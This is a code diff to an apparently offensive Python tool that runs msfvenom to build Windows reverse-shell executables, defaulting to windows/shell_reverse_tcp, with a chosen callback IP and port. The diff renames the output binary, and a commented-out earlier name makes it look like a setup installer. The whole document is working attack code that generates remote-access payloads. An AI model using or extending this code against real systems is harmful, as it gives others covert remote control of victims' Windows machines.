@@ -17,12 +17,12 @@ def get_ip(interface):
     
     return ip
 
-def gen_payload(ip, port, payload, dir):
+def gen_payload(ip, port, payload, dir, payload_name):
     """generate an msfvenom payload with given IP address and port"""
 
     # cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'
 
-    cmd_str = 'msfvenom -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heed\'setup.exe"'
+    cmd_str = 'msfvenom -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + '/' + payload_name + '"'
 
     print("Running command: " + cmd_str)
     
@@ -36,7 +36,8 @@ def get_payload(args, ip, port, path):
 
     payload_path = ""
 
-    payload_name = 'heed\'setup.exe'
+    #payload_name = 'heed\'setup.exe'
+    payload_name = 'h\'eed.exe'
 
     #get payload options, taking --payload as priority over --msf_payload if both provided
     if args.payload is not None:
@@ -59,9 +60,9 @@ def get_payload(args, ip, port, path):
             print("No --msf_payload or --payload flag provided. Using default windows/shell_reverse_tcp payload and generating with msfvenom")
 
         #generate shell payload
-        gen_payload(ip, port, msf_payload, path)
+        gen_payload(ip, port, msf_payload, path, payload_name)
 
-        payload_path = path + payload_name
+        payload_path = os.path.join(path, payload_name)
         print("Payload saved at: " + payload_path)
     
     #get size of payload
